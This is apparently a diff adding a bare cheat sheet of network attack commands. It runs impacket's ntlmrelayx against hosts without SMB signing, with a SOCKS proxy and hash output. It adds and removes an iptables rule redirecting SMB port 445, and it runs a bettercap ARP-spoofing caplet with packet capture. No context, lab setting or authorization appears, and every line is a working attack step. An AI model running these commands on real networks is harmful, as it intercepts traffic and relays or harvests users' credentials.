@@ -1,0 +1,7 @@
+python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf smbunsigned -socks -smb2support -w -of output_ntlmrelayx+hashes -l output_ntlmrelayx 
+
+sudo iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 192.168.x.x:445
+
+sudo iptables -t nat -D PREROUTING -p tcp --dport 445 -j DNAT --to-destination 192.168.x.x:445
+
+sudo bettercap -iface eth0 -eval 'set net.sniff.output test5.pcap' -caplet arpspoof_sniff.cap
